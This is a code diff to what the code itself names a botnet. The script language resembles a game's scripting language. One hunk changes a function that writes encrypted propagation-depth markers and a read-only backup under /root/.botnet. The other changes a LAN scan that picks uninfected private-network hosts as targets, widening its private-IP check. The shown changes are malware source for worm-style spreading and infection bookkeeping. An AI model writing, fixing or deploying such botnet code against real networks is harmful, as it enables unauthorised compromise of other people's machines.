@@ -170,24 +170,26 @@ store_depth_marker = function(my_ip, my_depth)
     
     // Encrypted global marker - atomic write
     pub = read_file("/root/.botnet/slave.pub")
-    if pub != null then
-        record = my_ip + "|" + str(my_depth) + "|" + str(time)
-        enc = Kyber.encrypt_message(pub, record)
-        if enc != null then
-            atomic_write(GLOBAL_DEPTH_FILE, enc)
-            set_permissions(GLOBAL_DEPTH_FILE, "600")
-        end if
+    if pub == null then
+        // Slave hasn't initialized yet - write plaintext marker only
+        log_master("Slave public key not found, skipping encrypted depth markers", "WARN")
+        return
+    end if
+    
+    record = my_ip + "|" + str(my_depth) + "|" + str(time)
+    enc = Kyber.encrypt_message(pub, record)
+    if enc != null then
+        atomic_write(GLOBAL_DEPTH_FILE, enc)
+        set_permissions(GLOBAL_DEPTH_FILE, "600")
     end if
     
     // Store immutable encrypted backup
     immutable_path = "/root/.botnet/depth_immutable.enc"
-    if pub != null then
-        immutable_record = my_ip + "|" + str(my_depth) + "|immutable"
-        immutable_enc = Kyber.encrypt_message(pub, immutable_record)
-        if immutable_enc != null then
-            safe_file_write(immutable_path, immutable_enc)
-            set_permissions(immutable_path, "400")  // Read-only
-        end if
+    immutable_record = my_ip + "|" + str(my_depth) + "|immutable"
+    immutable_enc = Kyber.encrypt_message(pub, immutable_record)
+    if immutable_enc != null then
+        safe_file_write(immutable_path, immutable_enc)
+        set_permissions(immutable_path, "400")  // Read-only
     end if
 end function
 
@@ -200,8 +202,8 @@ scan_lan = function()
         if ip == my_ip then continue
         if infected.indexOf(ip) != null then continue
         if SOURCE_IP != null and ip == SOURCE_IP then continue
-        // RFC 1918 LAN guard - only scan private IPs
-        if not (ip.indexOf("192.168.") == 0 or ip.indexOf("10.") == 0) then continue
+        // RFC 1918 LAN guard - only scan private IPs (complete range)
+        if not is_private_ip(ip) then continue
         targets.push(ip)
     end for
     return targets
